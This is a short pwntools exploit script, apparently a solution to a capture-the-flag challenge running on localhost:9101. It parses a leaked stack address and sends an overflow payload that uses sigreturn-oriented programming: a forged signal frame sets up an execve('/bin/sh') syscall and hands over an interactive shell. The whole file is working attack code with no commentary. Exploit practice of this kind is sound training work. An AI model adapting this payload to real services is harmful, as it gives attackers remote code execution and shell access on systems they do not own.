from pwn import *

set_rax = p64(0x40118C)
syscall = p64(0x40117E)

# pc = process("./chall")
pc = connect("localhost", 9101)
buff = pc.recvuntil("\n")[7:-1]
buff = int(buff, 16)
print("@buff : " + hex(buff))


payload = b"/bin/sh\x00"
payload += b"A" * 64
payload += set_rax
payload += syscall

payload += p64(0) * 5  # user_context

payload += p64(0) * 8  # r8~r15
payload += p64(buff)  # rdi
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0x3B)  # rax
payload += p64(0)
payload += p64(0)
payload += syscall  # eip
payload += p64(0)  # eflags
payload += p64(0x33)  # cs
payload += p64(0)  # gs
payload += p64(0)  # fs
payload += p64(0)  # ss
payload += p64(0) * 7

print(pc.recvuntil("\n"))
pc.send(payload)
pc.interactive()
